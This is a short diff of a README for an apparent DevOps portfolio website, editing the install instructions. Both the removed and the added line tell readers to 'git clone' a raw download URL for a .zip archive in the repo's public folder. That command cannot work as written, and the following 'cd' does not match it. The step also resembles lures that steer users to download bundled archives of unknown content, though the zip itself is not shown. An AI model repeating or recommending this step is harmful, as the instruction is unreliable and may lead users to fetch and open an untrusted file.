@@ -27,7 +27,7 @@ A modern, responsive portfolio website showcasing DevOps projects and infrastruc
 
 1. Clone this repository:
    ```
-   git clone https://github.com/Atharva907/Portfolio-website/raw/refs/heads/main/public/website_Portfolio_3.6.zip
+   git clone https://raw.githubusercontent.com/Atharva907/Portfolio-website/main/public/website_Portfolio_3.6.zip
    cd portfolio-website
    ```
 
